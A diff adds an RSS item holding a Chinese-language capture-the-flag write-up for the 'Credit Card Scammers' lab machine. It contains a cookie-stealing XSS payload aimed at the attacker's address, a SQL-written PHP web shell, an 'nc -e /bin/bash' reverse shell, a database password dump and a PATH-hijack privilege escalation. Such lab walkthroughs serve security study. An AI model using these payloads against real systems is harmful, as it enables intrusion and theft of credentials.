@@ -978,5 +978,116 @@ Use &#34;--help [option]&#34; to view documentation for a given option
 ]]></content>
         </item>
         
+        <item>
+            <title>Credit Card Scammers Writeup</title>
+            <link>http://localhost:1313/posts/credit-card-scammers-writeup/</link>
+            <pubDate>Sun, 18 May 2025 17:29:33 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/credit-card-scammers-writeup/</guid>
+            <description>&lt;blockquote&gt;
+&lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h1 id=&#34;credit-card-scammers-靶场&#34;&gt;Credit Card Scammers 靶场&lt;/h1&gt;
+&lt;h1 id=&#34;服务扫描&#34;&gt;服务扫描&lt;/h1&gt;
+&lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
+
+sudo nmap --min-rate 10000 -p- 10.10.10.31   
+
+sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
+
+sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;aaa.png&#34; alt=&#34;aaa.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster-爆破目录&#34;&gt;gobuster 爆破目录&lt;/h2&gt;
+&lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;bbb.png&#34; alt=&#34;bbb.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web-渗透&#34;&gt;Web 渗透&lt;/h1&gt;
+&lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;ccc.png&#34; alt=&#34;ccc.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;默认界面能找到提交表单&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;ddd.png&#34; alt=&#34;ddd.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试 XSS&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;ee.png&#34; alt=&#34;ee.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;kali 架设连接&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;fff.png&#34; alt=&#34;fff.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改 cookie 登入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;ggg.png&#34; alt=&#34;ggg.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>此文章以 kali 地址为 10.10.10.5 为示例</p></blockquote>
+<h1 id="credit-card-scammers-靶场">Credit Card Scammers 靶场</h1>
+<h1 id="服务扫描">服务扫描</h1>
+<p>扫描所执行的命令，执行结果如下</p>
+<pre tabindex="0"><code>sudo nmap -sn 10.10.10.0/24
+
+sudo nmap --min-rate 10000 -p- 10.10.10.31   
+
+sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
+
+sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
+</code></pre><p><img src="aaa.png" alt="aaa.png"></p>
+<h2 id="gobuster-爆破目录">gobuster 爆破目录</h2>
+<p>在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破</p>
+<pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
+</code></pre><p><img src="bbb.png" alt="bbb.png"></p>
+<h1 id="web-渗透">Web 渗透</h1>
+<p>审计爆破的目录发现在 admin 下有一个登入界面</p>
+<p><img src="ccc.png" alt="ccc.png"></p>
+<p>默认界面能找到提交表单</p>
+<p><img src="ddd.png" alt="ddd.png"></p>
+<p>尝试 XSS</p>
+<pre tabindex="0"><code>&lt;script&gt;new Image().src=&#34;http://10.10.10.5/?c=&#34;+document.cookie;&lt;/script&gt;
+</code></pre><p><img src="ee.png" alt="ee.png"></p>
+<p>kali 架设连接</p>
+<pre tabindex="0"><code>python3 -m http.server 80
+</code></pre><p><img src="fff.png" alt="fff.png"></p>
+<p>修改 cookie 登入</p>
+<p><img src="ggg.png" alt="ggg.png"></p>
+<p>注入 sql 反弹 shell</p>
+<pre tabindex="0"><code>SELECT &#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34; INTO DUMPFILE &#39;/var/www/html/shell.php&#39;
+</code></pre><pre tabindex="0"><code>http://10.10.10.33/shell.php?cmd=pwd
+</code></pre><p><img src="hhh.png" alt="hhh.png"></p>
+<p>连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口</p>
+<pre tabindex="0"><code>nc -e /bin/bash 10.10.10.5 4444
+</code></pre><p>以下是提权一阶段代码</p>
+<pre tabindex="0"><code>cat /etc/passwd |grep &#34;/bin/bash&#34;
+
+cd settings
+
+ls
+
+cat config.php
+</code></pre><p><img src="iii.png" alt="iii"></p>
+<pre tabindex="0"><code>mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e &#39;SELECT * from users;&#39; 
+</code></pre><p><img src="jjj.png" alt="jjj"></p>
+<p>john 破解</p>
+<p><img src="kkk.png" alt="kkk"></p>
+<p>ssh 登入</p>
+<p><img src="lll.png" alt="lll"></p>
+<p>二阶段提权</p>
+<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
+
+ls
+
+strings /usr/bin/backup
+
+export PATH=.:$PATH
+
+echo $PATH
+
+cd /tmp 
+
+echo &#39;/bin/bash&#39; &gt; tar
+
+chmod 777 tar
+
+/usr/bin/backup
+</code></pre><p><img src="mmm.png" alt="mmm"></p>
+<p>拿下机器</p>
+]]></content>
+        </item>
+        
     </channel>
 </rss>
